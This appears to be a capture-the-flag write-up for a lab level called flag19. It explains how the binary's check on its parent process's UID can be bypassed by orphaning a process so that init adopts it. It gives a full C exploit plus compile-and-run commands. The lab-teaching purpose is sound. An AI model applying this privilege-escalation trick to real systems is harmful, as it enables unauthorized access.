
---
### ğŸ§¬ Challenge Insight

> The binary `flag19` enforces access control by checking the **user ID of its parent process**. If the parent is **not root**, it refuses to proceed.
> 
> Our mission is to **alter the process hierarchy**, so that `flag19` runs under the **init process (PID 1)**, which has UID 0 â€” and bypasses the restriction.

**User:** `level19`  
**Binary:** `/home/flag19/flag19`  
**Goal:** Fool the binary into thinking its parent is privileged, and trigger `getflag`.

---

### ğŸ” Background Concept

#### âš™ï¸ How Linux Handles Orphans

- Each process in Linux is attached to a parent process (by PID).
    
- When a parent dies, the child becomes an **orphan**.
    
- The **init process (PID 1)** automatically adopts all orphaned processes.
    
- Since **init runs as root**, this trick can be used to **simulate a root-owned parent**.
    

---

### ğŸ§¨ Attack Blueprint

Weâ€™ll create a two-stage process:

1. **Parent forks a child**, then exits immediately.
    
2. **Child sleeps briefly**, allowing itself to be adopted by `init`.
    
3. Once re-parented, the child invokes `/home/flag19/flag19`, which now **detects UID 0 as its parent** and grants access.
    

---

### ğŸ› ï¸ Crafting the Exploit

```c
// orphan_bypass.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>

int main() {
    pid_t child = fork();

    if (child > 0) {
        // Step 1: Kill the parent quickly
        printf("[PARENT] PID: %d exiting...\n", getpid());
        exit(0);
    } else if (child == 0) {
        // Step 2: Orphaned child waits to be adopted by init
        printf("[CHILD] Orphaning in progress. PID: %d\n", getpid());
        sleep(3);

        // Step 3: Confirm we're now re-parented to PID 1
        printf("[CHILD] My current parent PID: %d\n", getppid());

        // Step 4: Attempt to launch flag19 under new parent
        char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
        execve("/home/flag19/flag19", args, NULL);

        // If exec fails
        err(1, "Failed to exec flag19");
    } else {
        perror("fork failed");
        exit(1);
    }

    return 0;
}
```

---

### âš™ï¸ Compile and Run

```bash
gcc orphan_bypass.c -o orphaner
./orphaner
```

â³ Wait 3 seconds. If successful, the `flag19` binary will now think itâ€™s being executed by **root's child**, due to PID 1 being its current parent.

---

### ğŸ¯ Flag Retrieval

Once the conditions are met, youâ€™ll see:

```bash
You have successfully executed getflag on a target account
```

No password, no prompt â€” just a clean privilege escalation via **process deception**.

---

### ğŸ“Œ Important Observations

- The **UID of the parent** is being used as a **trust anchor** â€” a weak foundation.
    
- Simply re-parenting via orphaning **tricks the binaryâ€™s logic** without needing any actual root access.
    
- This is a **logic flaw** tied to **trusting runtime metadata**, which is mutable through normal OS behavior.
    

---

### ğŸ§¹ Cleanup

To avoid zombie processes:

```bash
ps aux | grep orphaner
kill -9 <zombie-pid>  # if needed
```

---

### ğŸ§  Key Learnings

- Linux allows orphaned processes to be **adopted by init**, creating opportunities for **process tree manipulation**.
    
- Privilege-sensitive binaries that depend on `getppid()` and `getuid()` without **hard guarantees** are vulnerable.
    
- Trusting **external conditions** like process hierarchy can lead to **security bypasses**.
    

---
